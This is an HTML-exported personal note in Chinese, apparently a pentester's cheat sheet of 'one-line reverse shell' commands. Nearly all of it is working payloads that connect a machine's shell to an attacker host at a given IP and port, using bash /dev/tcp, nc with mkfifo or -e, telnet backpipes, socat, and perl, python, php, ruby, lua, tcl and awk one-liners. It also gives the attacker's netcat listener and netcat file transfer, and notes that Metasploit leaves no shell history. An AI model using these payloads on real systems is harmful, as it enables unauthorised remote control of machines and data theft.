<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>一句话反弹shell</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>一句话反弹shell</h1><br/>bash -i &gt;&amp;/dev/tcp/192.168.10.139/6666 0&gt;&amp;1 &amp;<br /><br /><br />bash -i 				产生一个交互式bash<br />&gt;&amp; /dev/tcp/ip/port 	建立TCP连接，并将标准输出和错误重定向到TCP连接<br />0&gt;&amp;1 					从TCP连接获取输入<br />&amp; 						后台运行<br /><br /><br /><br />攻击者运行<br />nv -lvvp 6666即可<br /><br /><br />其余的一句话反弹shell<br />rm /tmp/f;<br />mkfifo /tmp/f;<br />cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.190.138 6666&gt;/tmp/f<br /><br /><br />exec 5&lt;&gt;/dev/tcp/192.168.190.138/6666;cat &lt;&amp;5|while read line;do $line&gt;&amp;5 2&gt;&amp;1;done<br /><br /><br />文件传输<br /><br />这个顺序有点特殊，先执行接受端，然后是发送端在发送<br /><br />#文件从B-&gt;A<br />#首先在接受端A<br /># nc -lvvp 4444 &gt; aaaa.txt<br />#然后在发送端B<br /># nc -vv 127.0.0.1 4444 &lt; t1.sed<br /><br /><br /><br />文件传输使用管道符的写法<br /><br />#文件从 A-&gt;B传送<br />发送者A<br />$ cat backup.iso | nc -l 3333<br />接受者B<br />$ nc 192.168.0.1 3333 &gt; backup.iso<br /><br /><br />总结<br /><a href="https://mp.weixin.qq.com/s/RZRc0HTMwKtK4J1IHIYmdQ">https://mp.weixin.qq.com/s/RZRc0HTMwKtK4J1IHIYmdQ</a><br />指令类<br /><br /><br />    exec 5&lt;&gt;/dev/tcp/127.0.0.1/8080 <br />    cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done<br /><br /><br />    exec 2&gt;&amp;0;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/8080; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br /><br /><br />    /bin/sh -i &gt; /dev/tcp/127.0.0.1/8080 0&lt;&amp;1 2&gt;&amp;1<br /><br /><br />    Nc 1.1.1.1 10086 -e /bin/sh<br /><br />    nc 127.0.0.1 8080 -c /bin/bash<br /><br /><br />    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 8080 &gt;/tmp/f<br /><br /><br />    rm /tmp/backpipe;mknod /tmp/backpipe p;/bin/bash 0&lt;/tmp/backpipe | nc 127.0.0.1 8080 1&gt;/tmp/backpipe<br /><br /><br />    rm /tmp/backpipe;mknod /tmp/backpipe p &amp;&amp; telnet 127.0.0.1 8080 0&lt;/tmp/backpipe | /bin/bash 1&gt;/tmp/backpipe<br /><br /><br />    telnet 127.0.0.1 8080 | /bin/bash | telnet 192.168.149.133 9090<br />    mknod backpipe p &amp;&amp; telnet x.x.x.x 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe<br /><br />    socat tcp-connect:127.0.0.1:8080 exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane<br /><br /><br />脚本类<br /><br /><br />    perl -e &#39;use Socket;$i=&quot;127.0.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;<br /><br /><br />    perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;127.0.0.1:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;	<br /><br /><br />    python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;<br /><br /><br />    php -r &#39;$sock=fsockopen(&quot;127.0.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;<br /><br /><br />    ruby -rsocket -e&#39;f=TCPSocket.open(&quot;127.0.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;<br /><br /><br />    ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;127.0.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;<br /><br /><br />    lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;127.0.0.1&#39;,&#39;8080&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;<br /><br /><br />    echo &#39;set s [socket 127.0.0.1 8080];while 42 { puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;&#39; | tclsh<br /><br /><br />    awk &#39;BEGIN {s = &quot;/inet/tcp/0/127.0.0.1/8080&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39; /dev/null<br /><br /><br /><br />Xterm有一个但是没实现<br /><br />Metasploit   都是使用popen3函数实现 history肯定不会记录<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>